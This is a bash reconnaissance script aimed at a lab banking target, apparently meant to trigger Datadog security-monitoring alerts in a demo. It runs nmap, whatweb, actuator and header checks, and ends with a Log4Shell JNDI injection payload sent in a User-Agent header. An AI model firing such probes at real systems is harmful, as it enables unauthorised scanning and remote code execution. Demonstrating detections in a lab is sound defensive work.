#!/bin/bash
TARGET="${TARGET:-lab.dogbank.dog}"

echo "============================================================"
echo "  DogBank Security Recon — ${TARGET}"
echo "============================================================"

echo ""
echo "[ 1/5 ] Port scan + service detection..."
nmap -sV --open -p 80,443,8080,8088,8089,9090 "$TARGET" 2>/dev/null

echo ""
echo "[ 2/5 ] Web fingerprinting..."
whatweb -v "https://${TARGET}" 2>/dev/null

echo ""
echo "[ 3/5 ] Actuator endpoints (Spring Boot)..."
curl -sk "https://${TARGET}/actuator" | jq . 2>/dev/null || \
  curl -sk "https://${TARGET}/actuator" 2>/dev/null

echo ""
echo "[ 4/5 ] Security headers check..."
curl -sk -I "https://${TARGET}" | grep -iE "server|x-frame|strict-transport|content-security|x-content-type|x-powered"

echo ""
echo "[ 5/5 ] Log4Shell quick probe (User-Agent)..."
curl -sk -o /dev/null -w "HTTP %{http_code}\n" \
  -H 'User-Agent: ${jndi:ldap://log4shell-check.dogbank.internal/test}' \
  "https://${TARGET}/api/auth/login" \
  -d '{"cpf":"test","senha":"test"}' \
  -H 'Content-Type: application/json'

echo ""
echo "============================================================"
echo "  Recon completo. Verifique o Datadog ASM agora!"
echo "============================================================"
